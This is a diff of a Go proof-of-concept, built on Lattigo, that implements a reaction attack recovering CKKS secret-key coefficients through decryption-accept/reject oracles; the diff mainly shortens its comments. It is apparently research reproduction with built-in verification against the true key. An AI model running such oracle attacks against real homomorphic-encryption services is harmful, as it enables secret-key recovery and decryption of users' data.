@@ -1,5 +1,4 @@
-// Lattigo implementation of Algorithm 1 from
-// "Reaction Attack on CKKS and Its Variants".
+// CKKS reaction attack in Lattigo.
 package main
 
 import (
@@ -16,12 +15,7 @@ import (
 	"github.com/tuneinsight/lattigo/v6/schemes/ckks"
 )
 
-// parseSecret maps a -secret spec to a Lattigo distribution.
-//   p:<float>  Bernoulli ternary, Pr[s_i != 0] = float           (Lattigo default is p:0.666667)
-//   h:<int>    fixed-Hamming-weight ternary, exactly <int> nonzero coefficients
-//   g[:<sigma>] discrete Gaussian secret (default sigma=3.2), bound 6*sigma
-// Returns the distribution, a self-describing label, whether to use the
-// general bounded-secret binary-search recovery, and the bound S.
+// parseSecret accepts p:<probability>, h:<weight>, or g[:<sigma>].
 func parseSecret(spec string) (ring.DistributionParameters, string, bool, int) {
 	switch {
 	case strings.HasPrefix(spec, "p:"):
@@ -71,11 +65,7 @@ func main() {
 	fmt.Printf("=== Lattigo wire-format reaction attack (Algorithm 1) ===\n")
 	fmt.Printf("logN=%d  logDelta=%d  secret=%s\n", *logN, *logD, secretLabel)
 
-	// LogQ = [q0, 50, 50, 50, 50, 50]: q0 from -logq0 flag, four 50-bit primes for C2S,
-	// one 50-bit spare for the plaintext-ciphertext multiplication.
-	// Prime sizes track the scale: 50-bit by default, but at least logDelta
-	// so high-precision regimes (logDelta>50) rescale correctly. Lattigo
-	// deployments do not always use a uniform 50-bit chain.
+	// Chain: q0, four C2S primes, and one spare; upper primes track the scale.
 	psize := 50
 	if *logD > 50 {
 		psize = *logD
@@ -113,7 +103,7 @@ func main() {
 	}
 	fmt.Printf("Secret hamming weight = %d / %d\n", hw, N)
 
-	// C2S matrices and Galois keys.
+	// C2S keys.
 	logSlots := params.LogMaxSlots()
 	dftLevels := make([]int, len(c2sLevels))
 	for i := range dftLevels {
@@ -146,13 +136,13 @@ func main() {
 	encryptor := rlwe.NewEncryptor(params, pk)
 	_ = encryptor
 
-	// Step 1: build ct^(1) = (a - Delta, b).
+	// ct1 = (a - Delta, b).
 	ct1 := buildShiftedCt(params, pk, delta)
 
-	// Verify step 1: decryption gives Delta * s + e_pk.
+	// Check ct1 decrypts to Delta*s + e_pk.
 	verifyShiftedCt(params, dec, ct1, secret, delta)
 
-	// Step 2: CoeffsToSlots.
+	// Coefficients to slots.
 	t0 := time.Now()
 	ct2Real, ct2Imag, err := dftEval.CoeffsToSlotsNew(ct1, c2sMatrices)
 	if err != nil {
@@ -162,10 +152,10 @@ func main() {
 		time.Since(t0).Seconds(), ct2Real.Level(), levelOf(ct2Imag),
 		math.Log2(ct2Real.Scale.Float64()))
 
-	// Verify step 2: decoded slot k of ctReal ~ s_k; slot k of ctImag ~ s_{k+N/2}.
+	// Check the slot/coefficient map.
 	verifyC2S(params, encoder, dec, ct2Real, ct2Imag, secret)
 
-	// P4': empirical B_C2S measurement.
+	// Measure C2S noise.
 	if *measureC2S {
 		measureC2SNoise(params, encoder, dec, ct2Real, ct2Imag, secret)
 	}
@@ -177,7 +167,7 @@ func main() {
 		runGroupTest(params, pk, encryptor, eval, dec, ct2Real, ct2Imag, secret, chooseAlpha(N))
 		return
 	}
-	// Step 3+4: full attack loop.
+	// Recover every coefficient.
 	recovered := make([]int, N)
 	queries := 0
 	tAttack := time.Now()
@@ -191,8 +181,7 @@ func main() {
 		}
 
 		if boundedSearch {
-			// General bounded-secret recovery: O(log S) interval-bisection
-			// queries per coefficient (paper remark, Gaussian secrets).
+			// Bounded-secret bisection.
 			val, q, err := recoverCoeffBinary(params, encoder, encryptor, eval, ct2, slotIdx, secretBound, dec)
 			if err != nil {
 				panic(fmt.Errorf("binary-search i=%d: %w", i, err))
@@ -204,7 +193,6 @@ func main() {
 
 		alpha := chooseAlpha(N)
 
-		// Support test.
 		valid, normLog, err := supportOracle(params, encoder, encryptor, eval, ct2, slotIdx, alpha, dec)
 		if err != nil {
 			panic(fmt.Errorf("support i=%d: %w", i, err))
@@ -215,7 +203,6 @@ func main() {
 			recovered[i] = 0
 			continue
 		}
-		// Sign test.
 		validSign, _, err := signOracle(params, encoder, encryptor, eval, ct2, slotIdx, alpha, dec)
 		if err != nil {
 			panic(fmt.Errorf("sign i=%d: %w", i, err))
@@ -229,9 +216,7 @@ func main() {
 	}
 	wall := time.Since(tAttack)
 
-	// Map attack outputs (slot domain) back to coefficient domain via
-	// CKKS bit-reversal: slot k of the real/imag halves corresponds to
-	// polynomial coefficient bitReverse(k, logSlots) and bitReverse(k, logSlots)+N/2.
+	// Undo CKKS bit-reversal to return coefficient order.
 	logSlotsR := params.LogMaxSlots()
 	recoveredCoeff := make([]int, N)
 	for i := 0; i < N; i++ {
@@ -252,7 +237,6 @@ func main() {
 			correct++
 		}
 	}
-	// Also count non-permutation-invariant slot-level accuracy.
 	slotCorrect := 0
 	for i := 0; i < N; i++ {
 		if recovered[i] == secret[i] {
@@ -263,14 +247,12 @@ func main() {
 		correct, N, 100.0*float64(correct)/float64(N),
 		slotCorrect, N, 100.0*float64(slotCorrect)/float64(N),
 		queries, float64(queries)/float64(N), wall)
-	// Compact one-line summary for log scraping.
+	// Machine-readable result.
 	fmt.Printf("SUMMARY secret=%s logn=%d logq0=%d logd=%d N=%d hw=%d correct=%d queries=%d ratio=%.4f alpha=%d no_rlk=%t wall_seconds=%.4f\n",
 		secretLabel, *logN, *logQ0, *logD, N, hw, correct, queries, float64(queries)/float64(N), chooseAlpha(N), *noRlk, wall.Seconds())
 }
 
-// measureC2SNoise measures decoded slot residuals after CoeffsToSlots.  The
-// scaled values are diagnostics only: multiplying a slot residual by the CKKS
-// scale is not a coefficient-domain decryption-error measurement.
+// measureC2SNoise reports slot residuals; scaled slot values are diagnostic only.
 func measureC2SNoise(params ckks.Parameters, enc *ckks.Encoder, dec *rlwe.Decryptor, ctReal, ctImag *rlwe.Ciphertext, secret []int) {
 	N := params.N()
 	slots := params.MaxSlots()
@@ -359,14 +341,9 @@ func bitReverse(x, bits int) int {
 }
 
 func chooseAlpha(N int) int64 {
-	// Constant slot-domain amplitude: any alpha* in (tau, tau/nu_alpha) works for the
-	// slot-domain oracle (tau=1, nu_alpha<<1 measured); we fix alpha*=4. See paper Mask amplitude.
+	// tau=1; measured noise leaves margin at alpha=4.
 	_ = N
 	return 4
-	// Superseded coefficient-domain sizing alpha* = ceil(4 sqrt(N/2)) (inflates alpha*B_C2S at low precision):
-	// a := int64(math.Ceil(4.0 * math.Sqrt(float64(N)/2.0)))
-	// if a < 4 { a = 4 }
-	// return a
 }
 
 func levelOf(ct *rlwe.Ciphertext) int {
@@ -376,7 +353,7 @@ func levelOf(ct *rlwe.Ciphertext) int {
 	return ct.Level()
 }
 
-// extractSecret recovers the ternary secret coefficients from sk.
+// extractSecret returns centered secret coefficients.
 func extractSecret(sk *rlwe.SecretKey, ringQ *ring.Ring, N int) []int {
 	cp := sk.Value.Q.CopyNew()
 	ringQ.INTT(*cp, *cp)
@@ -401,14 +378,13 @@ func extractSecret(sk *rlwe.SecretKey, ringQ *ring.Ring, N int) []int {
 	return out
 }
 
-// buildShiftedCt constructs ct^(1) = (a - Delta, b) given the public key
-// pk = (-a*s + e, a) in Lattigo's NTT-Mont convention.
+// buildShiftedCt returns ct1=(a-Delta,b) from pk=(-a*s+e,a).
 func buildShiftedCt(params ckks.Parameters, pk *rlwe.PublicKey, delta uint64) *rlwe.Ciphertext {
 	ringQ := params.RingQ()
 	N := params.N()
 	ct := rlwe.NewCiphertext(params, 1, params.MaxLevel())
 
-	// c1 := -pk[1] (in NTT-Mont)
+	// c1 = -pk[1].
 	for limb := 0; limb < params.MaxLevel()+1; limb++ {
 		q := ringQ.SubRings[limb].Modulus
 		copy(ct.Value[1].Coeffs[limb], pk.Value[1].Q.Coeffs[limb])
@@ -418,7 +394,7 @@ func buildShiftedCt(params ckks.Parameters, pk *rlwe.PublicKey, delta uint64) *r
 			}
 		}
 	}
-	// Add constant polynomial Delta (matched to NTT-Mont form of c1).
+	// Add Delta.
 	deltaPoly := ringQ.NewPoly()
 	for limb := 0; limb < params.MaxLevel()+1; limb++ {
 		q := ringQ.SubRings[limb].Modulus
@@ -432,7 +408,7 @@ func buildShiftedCt(params ckks.Parameters, pk *rlwe.PublicKey, delta uint64) *r
 	ringQ.MForm(deltaPoly, deltaPoly)
 	ringQ.Add(ct.Value[1], deltaPoly, ct.Value[1])
 
-	// c0 := -pk[0] (in NTT-Mont)
+	// c0 = -pk[0].
 	for limb := 0; limb < params.MaxLevel()+1; limb++ {
 		q := ringQ.SubRings[limb].Modulus
 		copy(ct.Value[0].Coeffs[limb], pk.Value[0].Q.Coeffs[limb])
@@ -442,7 +418,7 @@ func buildShiftedCt(params ckks.Parameters, pk *rlwe.PublicKey, delta uint64) *r
 			}
 		}
 	}
-	// Convert NTT-Mont -> NTT-nonMont (standard ciphertext metadata).
+	// Store standard NTT form.
 	ringQ.IMForm(ct.Value[0], ct.Value[0])
 	ringQ.IMForm(ct.Value[1], ct.Value[1])
 	ct.MetaData.IsNTT = true
@@ -538,7 +514,7 @@ func verifyC2S(params ckks.Parameters, enc *ckks.Encoder, dec *rlwe.Decryptor, c
 	fmt.Println()
 }
 
-// supportOracle implements the Step 4 support test.
+// supportOracle tests whether a slot is nonzero.
 func supportOracle(params ckks.Parameters, encoder *ckks.Encoder, encryptor *rlwe.Encryptor, eval *ckks.Evaluator, ct2 *rlwe.Ciphertext, slotIdx int, alpha int64, dec *rlwe.Decryptor) (bool, float64, error) {
 	mask := make([]complex128, params.MaxSlots())
 	mask[slotIdx] = complex(float64(alpha), 0)
@@ -556,7 +532,7 @@ func supportOracle(params ckks.Parameters, encoder *ckks.Encoder, encryptor *rlw
 	return decryptionOracle(params, dec, ct3)
 }
 
-// signOracle implements the sign test by subtracting an encryption of alpha at slot i.
+// signOracle tests a nonzero slot's sign.
 func signOracle(params ckks.Parameters, encoder *ckks.Encoder, encryptor *rlwe.Encryptor, eval *ckks.Evaluator, ct2 *rlwe.Ciphertext, slotIdx int, alpha int64, dec *rlwe.Decryptor) (bool, float64, error) {
 	mask := make([]complex128, params.MaxSlots())
 	mask[slotIdx] = complex(float64(alpha), 0)
@@ -569,7 +545,7 @@ func signOracle(params ckks.Parameters, encoder *ckks.Encoder, encryptor *rlwe.E
 	if err != nil {
 		return false, 0, err
 	}
-	// Build encryption of "alpha at slot i" and subtract.
+	// Subtract Enc(alpha) at slot i.
 	offMask := make([]complex128, params.MaxSlots())
 	offMask[slotIdx] = complex(float64(alpha), 0)
 	ptOff := ckks.NewPlaintext(params, ct3.Level())
@@ -593,15 +569,7 @@ func signOracle(params ckks.Parameters, encoder *ckks.Encoder, encryptor *rlwe.E
 	return decryptionOracle(params, dec, ct3)
 }
 
-// intervalOracle isolates slot slotIdx of ct2 with scalar alpha, shifts by an
-// encrypted offset alpha*offset, adds a fresh encryption of zero, and applies
-// the same |slot| <= tau reaction oracle (tau = 1). The decoded slot carries
-// alpha*(s - offset), so the oracle returns valid iff |s - offset| <= 1/alpha,
-// i.e., iff the targeted coefficient lies in the symmetric integer interval of
-// half-width 1/alpha centered at offset. Choosing alpha = 1/w realizes a
-// membership test for any window, which is what the binary search bisects on.
-// Only public material (pk via encryptor, Galois/relin keys via eval) and the
-// oracle's accept/reject bit are used; the secret is never read here.
+// intervalOracle tests |s-offset| <= 1/alpha using public material and one reaction bit.
 func intervalOracle(params ckks.Parameters, encoder *ckks.Encoder, encryptor *rlwe.Encryptor, eval *ckks.Evaluator, ct2 *rlwe.Ciphertext, slotIdx int, alpha, offset float64, dec *rlwe.Decryptor) (bool, error) {
 	mask := make([]complex128, params.MaxSlots())
 	mask[slotIdx] = complex(alpha, 0)
@@ -636,13 +604,7 @@ func intervalOracle(params ckks.Parameters, encoder *ckks.Encoder, encryptor *rl
 	return ok, err
 }
 
-// recoverCoeffBinary recovers one integer secret coefficient s in [-S, S] by
-// interval bisection over the candidate range, using only the accept/reject
-// bit of intervalOracle. Each step tests membership in the left sub-interval
-// [lo, mid] (center c = (lo+mid)/2, half-width w = (mid-lo)/2 + 1/2 so that the
-// integers in [lo, mid] are inside and the next integer out is excluded), and
-// uses alpha = 1/w. Returns the recovered value and the number of queries spent
-// (ceil(log2(2S+1)) per coefficient, i.e., the paper's O(log S)).
+// recoverCoeffBinary bisects the integer range [-S,S].
 func recoverCoeffBinary(params ckks.Parameters, encoder *ckks.Encoder, encryptor *rlwe.Encryptor, eval *ckks.Evaluator, ct2 *rlwe.Ciphertext, slotIdx, S int, dec *rlwe.Decryptor) (int, int, error) {
 	lo, hi := -S, S
 	q := 0
@@ -666,7 +628,6 @@ func recoverCoeffBinary(params ckks.Parameters, encoder *ckks.Encoder, encryptor
 }
 
 func decryptionOracle(params ckks.Parameters, dec *rlwe.Decryptor, ct *rlwe.Ciphertext) (bool, float64, error) {
-	// Oracle decision: max |decoded slot| <= 1.
 	pt := ckks.NewPlaintext(params, ct.Level())
 	pt.MetaData = ct.MetaData
 	dec.Decrypt(ct, pt)
@@ -683,5 +644,5 @@ func decryptionOracle(params ckks.Parameters, dec *rlwe.Decryptor, ct *rlwe.Ciph
 		}
 	}
 	threshold := 1.0
-	return maxMag <= threshold, math.Log2(maxMag+1.0), nil
+	return maxMag <= threshold, math.Log2(maxMag + 1.0), nil
 }
